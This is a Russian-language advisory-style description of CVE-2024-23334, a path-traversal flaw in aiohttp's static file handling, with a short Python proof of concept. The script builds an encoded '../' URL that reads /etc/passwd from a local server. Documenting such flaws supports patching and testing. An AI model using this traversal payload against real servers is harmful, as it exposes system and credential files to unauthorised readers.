### Описание уязвимости CVE-2024-23334
CVE-2024-23334 aiohttp от 1.0.5 до 3.9.2 (исключая) \
Уязвимость позволяет удаленному непривилегированному злоумышленнику получить несанкционированный доступ к чтению конфиденциальных данных. Эксплуатация возможна из-за отсутствия проверки передаваемого пути к директории статических файлов, когда параметр follow_symlinks=True, который установлен в False по умолчанию. Для эксплуатации уязвимости злоумышленник должен отправить специальным образом сформированный сетевой запрос.
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

```python
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:8080"   # уязвимый aiohttp-сервер
STATIC_ROUTE = "/static/"            
TARGET_FILE = "/etc/passwd"          # что хотим прочитать

TRAVERSAL = "%2e%2e%2f"

payload_path = f"{STATIC_ROUTE}{TRAVERSAL * 6}{TARGET_FILE.lstrip('/')}"

poc_url = urljoin(BASE_URL.rstrip("/") + "/", payload_path.lstrip("/"))

print("[*] CVE-2024-23334 PoC")
print("[*] Payload (encoded '../'):", TRAVERSAL)
print("[*] Payload inserted path  :", payload_path)
print("[*] Final URL to request   :", poc_url)
```
